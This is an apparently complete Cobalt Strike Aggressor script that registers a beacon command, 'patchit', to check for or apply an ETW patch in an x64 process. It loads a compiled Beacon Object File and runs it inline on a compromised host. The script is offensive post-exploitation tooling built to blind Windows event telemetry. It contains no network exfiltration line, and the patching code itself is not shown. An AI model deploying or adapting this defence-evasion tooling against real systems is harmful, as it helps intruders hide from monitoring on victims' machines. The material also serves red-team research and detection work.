beacon_command_register(
    "patchit", 
    "All-in-one to check and patch ETW for x64 process", 
    "Available Commands:\n" .
        "\tCheck if ETW is patched:              patchit check\n" .
        "\tPatch ETW:                            patchit patch\n" .
);

alias patchit {

    if(size(@_) != 2)
    {
        berror($1, "Incorrect usage!");
        berror($1, beacon_command_detail("patchit"));
        return;
    }

    local('$barch $handle $data $args');

    # Get beacon architecture
    $barch = barch($1);


    if ($barch !eq 'x64')
    {
        berror($1, "patchit only supports x64 process");
        return;
    }

    if ($2 eq "check")
    {
        $args = bof_pack($1,"i",1);
    }

    else if ($2 eq "patch")
    {
        $args = bof_pack($1,"i",2);
    }
    else
    {
        berror($1, "Unkown command: " . $2);
        berror($1, beacon_command_detail("patchit"));
        return;
    }


    # Load BOF
    $handle = openf(script_resource("patchit. $+ $barch $+ .o"));
    $data = readb($handle, -1);
    closef($handle);

    # Execute BOF
    btask($1, "All-in-one to patch, check and revert AMSI and ETW for x64 process | James Yeung | github.com/ScriptIdiot");
    beacon_inline_execute($1, $data, "go", $args);

}
